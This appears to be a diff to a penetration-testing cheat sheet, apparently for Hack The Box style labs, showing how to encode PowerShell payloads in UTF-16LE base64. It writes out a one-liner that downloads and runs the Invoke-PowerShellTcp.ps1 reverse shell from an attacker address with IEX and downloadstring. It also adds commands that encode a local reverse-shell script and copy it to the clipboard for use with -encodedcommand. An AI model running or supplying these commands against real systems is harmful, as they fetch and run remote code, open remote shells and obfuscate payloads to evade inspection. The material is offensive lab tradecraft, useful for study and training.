@@ -4,8 +4,15 @@ echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13
 
 
 Convert Powershell command to UTF-16LE and Base64:
-echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16L | base64 -w 0
+echo -n "IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
 
+
+Convert Powershell file to UTF-16LE and Base64:
+cat powershelltcp.ps1 | iconv --to-code UTF-16LE | base64 -w 0
+
+
+Convert Powershell file to UTF-16LE and Base64 and copy to clipboard:
+cat powershelltcp.ps1 | iconv --to-code UTF-16LE | base64 -w 0 | xclip -selection clipboard
 
 
 Run with Powershell -encodedcommand:
